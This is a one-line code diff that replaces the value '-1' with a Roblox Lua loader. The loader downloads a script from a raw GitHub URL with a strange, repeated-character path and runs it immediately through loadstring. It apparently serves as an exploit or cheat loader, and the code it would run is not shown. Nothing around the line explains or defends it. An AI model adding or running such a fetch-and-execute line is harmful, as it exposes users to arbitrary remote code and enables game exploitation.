@@ -1,1 +1,1 @@
-1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/renluayyds666/ren/main/ymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymymym.lua"))();
